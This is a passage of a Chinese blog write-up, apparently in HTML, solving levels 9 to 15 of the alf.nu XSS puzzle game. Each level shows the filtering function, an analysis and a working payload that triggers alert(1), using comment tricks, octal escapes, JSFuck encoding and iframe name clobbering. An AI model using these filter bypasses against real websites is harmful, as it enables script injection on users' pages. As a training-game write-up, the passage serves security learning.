+<h3 id="9-3-Payload"><a href="#9-3-Payload" class="headerlink" title="9.3 Payload"></a>9.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;<span class="hljs-regexp">/&lt;/</span>scriptscript&gt;&lt;script&gt;alert(<span class="hljs-number">1</span>)<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-alf.nu/20190606102708.png" srcset="/img/loading.gif"></p>
+<h2 id="10-Callback-2"><a href="#10-Callback-2" class="headerlink" title="10. Callback 2"></a>10. Callback 2</h2><h3 id="10-1-源码"><a href="#10-1-源码" class="headerlink" title="10.1 源码"></a>10.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-comment">// Pass inn &quot;callback#userdata&quot;</span><br>    <span class="hljs-keyword">var</span> thing = s.split(<span class="hljs-regexp">/#/</span>);<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-regexp">/^[a-zA-Z\[\]&#x27;]*$/</span>.test(thing[<span class="hljs-number">0</span>])) <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid callback&#x27;</span>;<br>    <span class="hljs-keyword">var</span> obj = &#123;<br>        <span class="hljs-string">&#x27;userdata&#x27;</span>: thing[<span class="hljs-number">1</span>]<br>    &#125;;<br>    <span class="hljs-keyword">var</span> json = <span class="hljs-built_in">JSON</span>.stringify(obj).replace(<span class="hljs-regexp">/\//g</span>, <span class="hljs-string">&#x27;\\/&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;script&gt;&quot;</span> + thing[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot;(&quot;</span> + json + <span class="hljs-string">&quot;)&lt;/script&gt;&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="10-2-分析"><a href="#10-2-分析" class="headerlink" title="10.2 分析"></a>10.2 分析</h3><p>与第6题的类似，但是转义了<code>/</code>，导致<code>//</code>这个注释符无法使用，但是<code>JavaScript</code>的注释符有三种，分别是<code>//</code>、<code>/**/</code>、<code>&lt;!--</code>。<br>可以使用<code>&lt;!--</code>来注释。</p>
+<h3 id="10-3-Payload"><a href="#10-3-Payload" class="headerlink" title="10.3 Payload"></a>10.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&#x27;#&#x27;</span>;alert(<span class="hljs-number">1</span>)&lt;!--<br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-alf.nu/20190606103458.png" srcset="/img/loading.gif"></p>
+<h2 id="11-Skandia-2"><a href="#11-Skandia-2" class="headerlink" title="11. Skandia 2"></a>11. Skandia 2</h2><h3 id="11-1-源码"><a href="#11-1-源码" class="headerlink" title="11.1 源码"></a>11.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-regexp">/[&lt;&gt;]/</span>.test(s)) <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;-&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span> + s.toUpperCase() + <span class="hljs-string">&#x27;&quot;)&lt;/script&gt;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="11-2-分析"><a href="#11-2-分析" class="headerlink" title="11.2 分析"></a>11.2 分析</h3><p>代码过滤了<code>&lt;</code>、<code>&gt;</code>。还将所有输入的字母变成了大写，不能借助<code>toUpperCase()</code>的特性来解了。<br>可以利用<code>jsfuck</code>。<br>直接将<code>&quot;);alert(1)//</code>中的<code>alert(1)</code>用<code>jsfuck</code>表示。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.jsfuck.com/<br></code></pre></td></tr></table></figure>
+<p>但是直接使用工具生成的<code>jsfuck</code>太长了，不过我们还有另一种方法，就是<code>JS</code>的匿名函数。</p>
+<p><img src="https://image.mengsec.com/xss-alf.nu/20190609160959.png" srcset="/img/loading.gif"></p>
+<p>我们可以通过这种方法来执行任意方法。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">[][<span class="hljs-string">&#x27;map&#x27;</span>][<span class="hljs-string">&#x27;constructor&#x27;</span>](<span class="hljs-string">&#x27;alert(1)&#x27;</span>)()<br></code></pre></td></tr></table></figure>
+<p>由于对字母进行了大写转换，我们可以将其进行8进制编码，然后闭合前面，注释后面。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;);[][&#x27;\155\141\160&#x27;][&#x27;\143\157\156\163\164\162\165\143\164\157\162&#x27;](&#x27;\141\154\145\162\164(1)&#x27;)()//</span><br></code></pre></td></tr></table></figure>
+<h3 id="11-3-Payload"><a href="#11-3-Payload" class="headerlink" title="11.3 Payload"></a>11.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">方法一 <span class="hljs-number">1232</span>个字符<br><span class="hljs-string">&quot;);[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()//</span><br><span class="hljs-string">方法二 100个字符</span><br><span class="hljs-string">&quot;</span>);[][<span class="hljs-string">&#x27;\155\141\160&#x27;</span>][<span class="hljs-string">&#x27;\143\157\156\163\164\162\165\143\164\157\162&#x27;</span>](<span class="hljs-string">&#x27;\141\154\145\162\164(1)&#x27;</span>)()<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-alf.nu/20190609162353.png" srcset="/img/loading.gif"></p>
+<h2 id="12-iframe"><a href="#12-iframe" class="headerlink" title="12. iframe"></a>12. iframe</h2><h3 id="12-1-源码"><a href="#12-1-源码" class="headerlink" title="12.1 源码"></a>12.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> tag = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;iframe&#x27;</span>);<br><br>    <span class="hljs-comment">// For this one, you get to run any code you want, but in a &quot;sandboxed&quot; iframe.</span><br>    <span class="hljs-comment">// https://4i.am/?...raw=... just outputs whatever you pass in.</span><br>    <span class="hljs-comment">// Alerting from 4i.am won&#x27;t count.</span><br>    s = <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span> + s + <span class="hljs-string">&#x27;&lt;\/script&gt;&#x27;</span>;<br>    tag.src = <span class="hljs-string">&#x27;https://4i.am/?:XSS=0&amp;CT=text/html&amp;raw=&#x27;</span> + <span class="hljs-built_in">encodeURIComponent</span>(s);<br><br>    <span class="hljs-built_in">window</span>.WINNING = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>        youWon = <span class="hljs-literal">true</span>;<br>    &#125;;<br><br>    tag.setAttribute(<span class="hljs-string">&#x27;onload&#x27;</span>, <span class="hljs-string">&#x27;youWon &amp;&amp; alert(1)&#x27;</span>);<br>    <span class="hljs-keyword">return</span> tag.outerHTML;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="12-2-分析"><a href="#12-2-分析" class="headerlink" title="12.2 分析"></a>12.2 分析</h3><p>代码逻辑很简单，只要使<code>youWon</code>为<code>true</code>，这样就能执行<code>alert(1)</code>了。<br>解决思路是利用到<code>iframe</code>的特性，当在<code>iframe</code>中设置了一个<code>name</code>属性之后， 这个<code>name</code>属性的值就会变成<code>iframe</code>中的<code>window</code>对象的全局。</p>
+<h3 id="12-3-Payload"><a href="#12-3-Payload" class="headerlink" title="12.3 Payload"></a>12.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">name=<span class="hljs-string">&quot;youWon&quot;</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-alf.nu/20190609163222.png" srcset="/img/loading.gif"></p>
+<h2 id="13-TI-S-M"><a href="#13-TI-S-M" class="headerlink" title="13. TI(S)M"></a>13. TI(S)M</h2><h3 id="13-1-源码"><a href="#13-1-源码" class="headerlink" title="13.1 源码"></a>13.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">json</span>(<span class="hljs-params">s</span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">JSON</span>.stringify(s).replace(<span class="hljs-regexp">/\//g</span>, <span class="hljs-string">&#x27;\\/&#x27;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">html</span>(<span class="hljs-params">s</span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> s.replace(<span class="hljs-regexp">/[&lt;&gt;&quot;&amp;]/g</span>,<br>        <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">s</span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&amp;#&#x27;</span> + s.charCodeAt(<span class="hljs-number">0</span>) + <span class="hljs-string">&#x27;;&#x27;</span>;<br>        &#125;);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> (<span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span> + <span class="hljs-string">&#x27;var url = &#x27;</span> + json(s) + <span class="hljs-string">&#x27;; // We\&#x27;ll use this later &#x27;</span> + <span class="hljs-string">&#x27;&lt;/script&gt;\n\n&#x27;</span> + <span class="hljs-string">&#x27;  &lt;!-- for debugging --&gt;\n&#x27;</span> + <span class="hljs-string">&#x27;  URL: &#x27;</span> + html(s) + <span class="hljs-string">&#x27;\n\n&#x27;</span> + <span class="hljs-string">&#x27;&lt;!-- then suddenly --&gt;\n&#x27;</span> + <span class="hljs-string">&#x27;&lt;script&gt;\n&#x27;</span> + <span class="hljs-string">&#x27;  if (!/^http:.*/.test(url)) console.log(&quot;Bad url: &quot; + url);\n&#x27;</span> + <span class="hljs-string">&#x27;  else new Image().src = url;\n&#x27;</span> + <span class="hljs-string">&#x27;&lt;/script&gt;&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="13-2-分析"><a href="#13-2-分析" class="headerlink" title="13.2 分析"></a>13.2 分析</h3><p>本题用到了一个小<code>trick</code>:<br><code>HTML5</code>解析器会将<code>&lt;!--&lt;script&gt;</code>到<code>&lt;/script&gt;</code>之间的任何东西都当作<code>JavaScript</code>代码处理，同时要确保代码中还有一个<code>--&gt;</code>来防止解析器报语法错误。</p>
+<p>首先输入一个<code>&lt;!--&lt;script&gt;</code>，此时的输出中</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;!--<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>&quot;; // We&#x27;ll use this later <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><br>  &lt;!-- <span class="hljs-keyword">for</span> debugging --&gt;<br>  URL: &amp;#60;!--&amp;#60;script&amp;#62;<br><br>&lt;!-- then suddenly --&gt;<br>&lt;script&gt;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-regexp">/^http:.*/</span>.test(url)) <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Bad url: &quot;</span> + url);<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">new</span> Image().src = url;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+<p>这一段所有的代码都会当做<code>JS</code>执行。<br>在后面有个正则表达式<code>!/^http:.*/</code>，其中的<code>*/</code>可以当做注释，那么我们在前面再加入一个<code>/*</code>即可闭合。<br>此时的输出为</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-keyword">var</span> url = <span class="hljs-string">&quot;\/*&lt;!--&lt;script&gt;&quot;</span>; <span class="hljs-comment">// We&#x27;ll use this later &lt;/script&gt;</span><br><br>  &lt;!-- <span class="hljs-keyword">for</span> debugging --&gt;<br>  URL: <span class="hljs-comment">/*&amp;#60;!--&amp;#60;script&amp;#62;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">&lt;!-- then suddenly --&gt;</span><br><span class="hljs-comment">&lt;script&gt;</span><br><span class="hljs-comment">  if (!/^http:.*/</span>.test(url)) <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Bad url: &quot;</span> + url);<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">new</span> Image().src = url;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+<p>那么，在注释符之前添加要执行的代码就可以了。</p>
+<h3 id="13-3-Payload"><a href="#13-3-Payload" class="headerlink" title="13.3 Payload"></a>13.3 Payload</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">if</span>(alert(<span class="hljs-number">1</span>)<span class="hljs-comment">/*&lt;!--&lt;script&gt;</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-alf.nu/20190606192201.png" srcset="/img/loading.gif"></p>
+<h2 id="14-JSON-3"><a href="#14-JSON-3" class="headerlink" title="14. JSON 3"></a>14. JSON 3</h2><h3 id="14-1-源码"><a href="#14-1-源码" class="headerlink" title="14.1 源码"></a>14.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> s.split(<span class="hljs-string">&#x27;#&#x27;</span>).map(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">v</span>) </span>&#123;<br>        <span class="hljs-comment">// Only 20% of slashes are end tags; save 1.2% of total</span><br>        <span class="hljs-comment">// bytes by only escaping those.</span><br>        <span class="hljs-keyword">var</span> json = <span class="hljs-built_in">JSON</span>.stringify(v).replace(<span class="hljs-regexp">/&lt;\//g</span>, <span class="hljs-string">&#x27;&lt;\\/&#x27;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;console.log(&#x27;</span> + json + <span class="hljs-string">&#x27;)&lt;/script&gt;&#x27;</span>;<br>    &#125;).join(<span class="hljs-string">&#x27;&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="14-2-分析"><a href="#14-2-分析" class="headerlink" title="14.2 分析"></a>14.2 分析</h3><p>题目思路与上一个题类似，借助<code>&lt;!--&lt;script&gt;</code>来执行JS代码，不过因为后面没有<code>--&gt;</code>，解析器会报错，需要我们在后面构造一个<code>--&gt;</code>来避免报错。</p>
+<p>构造的<code>Payload</code>为<code>&lt;!--&lt;script&gt;#)/;alert(1)//--&gt;</code>，此时输出为</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;&lt;!--&lt;script&gt;&quot;</span>)&lt;<span class="hljs-regexp">/script&gt;&lt;script&gt;console.log(&quot;)/</span>;alert(<span class="hljs-number">1</span>)<span class="hljs-comment">//--&gt;&quot;)&lt;/script&gt;</span><br></code></pre></td></tr></table></figure>
+<p>其中<code>/script&gt;&lt;script&gt;console.log(&quot;)/</code>被当做了正则表达式解析，后面通过分号分割后，成功执行代码<code>alert(1)</code>。</p>
+<h3 id="14-3-Payload"><a href="#14-3-Payload" class="headerlink" title="14.3 Payload"></a>14.3 Payload</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;!--&lt;script&gt;#)/;alert(1)//--&gt;<br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-alf.nu/20190606193722.png" srcset="/img/loading.gif"></p>
+<h2 id="15-Skandia-3"><a href="#15-Skandia-3" class="headerlink" title="15. Skandia 3"></a>15. Skandia 3</h2><h3 id="15-1-源码"><a href="#15-1-源码" class="headerlink" title="15.1 源码"></a>15.1 源码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">s</span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-regexp">/[\\&lt;&gt;]/</span>.test(s)) <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;-&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span> + s.toUpperCase() + <span class="hljs-string">&#x27;&quot;)&lt;/script&gt;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="15-2-分析"><a href="#15-2-分析" class="headerlink" title="15.2 分析"></a>15.2 分析</h3><p>代码过滤了<code>\</code>、<code>&lt;</code>、<code>&gt;</code>、同样使用<code>jsfuck</code>就能过。因为对<code>\</code>进行了过滤，不能使用八进制编码来绕过了。<br>根据<code>jsfuck</code>的<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/JSFuck">原理</a>，我们借助匿名函数来构造一个更短的<code>Payload</code>。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">[][<span class="hljs-string">&quot;sort&quot;</span>][<span class="hljs-string">&quot;constructor&quot;</span>](<span class="hljs-string">&#x27;alert(1)&#x27;</span>)()<br></code></pre></td></tr></table></figure>
+<p>接下来的目标是将其中的字母以其他形式来表示。</p>
+<ul>
+<li>用 <code>!</code> 开头会转换成 <code>Boolean 布尔值</code></li>
+<li>用 <code>+</code> 开头会转换成 <code>Number 数值类型</code></li>
+<li>添加 <code>[]</code> 会转换成 <code>String 字符串</code></li>
+<li><code>![] === false</code> 、 <code>+[] === 0</code> 、 <code>[]+[] === &quot;&quot;</code></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>值</th>
+<th>经过jsfuck转换后</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>false</td>
+<td><code>![]</code></td>
+</tr>
+<tr>
+<td>true</td>
+<td><code>!![]</code>或<code>!+[]</code></td>
+</tr>
+<tr>
+<td>NaN</td>
+<td><code>+[![]]</code>或<code>+[][[]]</code></td>
+</tr>
+<tr>
+<td>undefined</td>
+<td><code>[][[]]</code></td>
+</tr>
+<tr>
+<td>Infinity</td>
+<td><code>+(+!+[]+(!+[]+[])[!+[]+!+[]+!+[]]+[+!+[]]+[+[]]+[+[]]+[+[]])</code></td>
+</tr>
+</tbody></table>
+<p>由此我们需要获得<code>construale</code>这些字符的特殊表示。很明显，上述表格内的字母是不够的，需要继续构造。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">(![]+[])[<span class="hljs-number">0</span>]+([][[]]+[])[<span class="hljs-number">5</span>]+(![]+[])[<span class="hljs-number">2</span>]+(![]+[])[<span class="hljs-number">2</span>] === <span class="hljs-string">&quot;fill&quot;</span><br>[][<span class="hljs-string">&#x27;fill&#x27;</span>]+[] === [][(![]+[])[<span class="hljs-number">0</span>]+([][[]]+[])[<span class="hljs-number">5</span>]+(![]+[])[<span class="hljs-number">2</span>]+(![]+[])[<span class="hljs-number">2</span>]]+[] ===<span class="hljs-string">&quot;function fill() &#123; [native code] &#125;&quot;</span><br></code></pre></td></tr></table></figure>
+<p>可得</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;c&quot;</span> === ([][(![]+[])[<span class="hljs-number">0</span>]+([][[]]+[])[<span class="hljs-number">5</span>]+(![]+[])[<span class="hljs-number">2</span>]+(![]+[])[<span class="hljs-number">2</span>]]+[])[<span class="hljs-number">3</span>]<br><span class="hljs-string">&quot;o&quot;</span> === ([][(![]+[])[<span class="hljs-number">0</span>]+([][[]]+[])[<span class="hljs-number">5</span>]+(![]+[])[<span class="hljs-number">2</span>]+(![]+[])[<span class="hljs-number">2</span>]]+[])[<span class="hljs-number">6</span>]<br><span class="hljs-string">&quot;n&quot;</span> === ([][[]]+[])[<span class="hljs-number">1</span>]<br><span class="hljs-string">&quot;s&quot;</span> === (![]+[])[<span class="hljs-number">3</span>]<br><span class="hljs-string">&quot;t&quot;</span> === (!![]+[])[<span class="hljs-number">0</span>]<br><span class="hljs-string">&quot;r&quot;</span> === (!![]+[])[<span class="hljs-number">1</span>]<br><span class="hljs-string">&quot;u&quot;</span> === (!![]+[])[<span class="hljs-number">2</span>]<br><span class="hljs-string">&quot;a&quot;</span> === (![]+[])[<span class="hljs-number">1</span>]<br><span class="hljs-string">&quot;l&quot;</span> === (![]+[])[<span class="hljs-number">2</span>]<br><span class="hljs-string">&quot;e&quot;</span> === (![]+[])[<span class="hljs-number">4</span>]<br></code></pre></td></tr></table></figure>
+<p>可得</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;sort&quot;</span> === (![]+[])[<span class="hljs-number">3</span>]+([][(![]+[])[<span class="hljs-number">0</span>]+([][[]]+[])[<span class="hljs-number">5</span>]+(![]+[])[<span class="hljs-number">2</span>]+(![]+[])[<span class="hljs-number">2</span>]]+[])[<span class="hljs-number">6</span>]+(!![]+[])[<span class="hljs-number">1</span>]+(!![]+[])[<span class="hljs-number">0</span>]<br><span class="hljs-string">&quot;constructor&quot;</span> === ([][(![]+[])[<span class="hljs-number">0</span>]+([][[]]+[])[<span class="hljs-number">5</span>]+(![]+[])[<span class="hljs-number">2</span>]+(![]+[])[<span class="hljs-number">2</span>]]+[])[<span class="hljs-number">3</span>]+([][(![]+[])[<span class="hljs-number">0</span>]+([][[]]+[])[<span class="hljs-number">5</span>]+(![]+[])[<span class="hljs-number">2</span>]+(![]+[])[<span class="hljs-number">2</span>]]+[])[<span class="hljs-number">6</span>]+([][[]]+[])[<span class="hljs-number">1</span>]+(![]+[])[<span class="hljs-number">3</span>]+(!![]+[])[<span class="hljs-number">0</span>]+(!![]+[])[<span class="hljs-number">1</span>]+(!![]+[])[<span class="hljs-number">2</span>]+([][(![]+[])[<span class="hljs-number">0</span>]+([][[]]+[])[<span class="hljs-number">5</span>]+(![]+[])[<span class="hljs-number">2</span>]+(![]+[])[<span class="hljs-number">2</span>]]+[])[<span class="hljs-number">3</span>]+(!![]+[])[<span class="hljs-number">0</span>]+([][(![]+[])[<span class="hljs-number">0</span>]+([][[]]+[])[<span class="hljs-number">5</span>]+(![]+[])[<span class="hljs-number">2</span>]+(![]+[])[<span class="hljs-number">2</span>]]+[])[<span class="hljs-number">6</span>]+(!![]+[])[<span class="hljs-number">1</span>]<br><span class="hljs-string">&quot;alert&quot;</span> === (![]+[])[<span class="hljs-number">1</span>]+(![]+[])[<span class="hljs-number">2</span>]+(![]+[])[<span class="hljs-number">4</span>]+(!![]+[])[<span class="hljs-number">1</span>]+(!![]+[])[<span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure>
+<p>将其拼接入<code>Payload</code>，长度为<code>525</code>。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;);[][(![]+[])[3]+([][(![]+[])[0]+([][[]]+[])[5]+(![]+[])[2]+(![]+[])[2]]+[])[6]+(!![]+[])[1]+(!![]+[])[0]][([][(![]+[])[0]+([][[]]+[])[5]+(![]+[])[2]+(![]+[])[2]]+[])[3]+([][(![]+[])[0]+([][[]]+[])[5]+(![]+[])[2]+(![]+[])[2]]+[])[6]+([][[]]+[])[1]+(![]+[])[3]+(!![]+[])[0]+(!![]+[])[1]+(!![]+[])[2]+([][(![]+[])[0]+([][[]]+[])[5]+(![]+[])[2]+(![]+[])[2]]+[])[3]+(!![]+[])[0]+([][(![]+[])[0]+([][[]]+[])[5]+(![]+[])[2]+(![]+[])[2]]+[])[6]+(!![]+[])[1]]((![]+[])[1]+(![]+[])[2]+(![]+[])[4]+(!![]+[])[1]+(!![]+[])[0]+&#x27;(1)&#x27;)()//</span><br></code></pre></td></tr></table></figure>
+<p>从网上找了一种更为简便的方法。</p>
+<table>
+<thead>
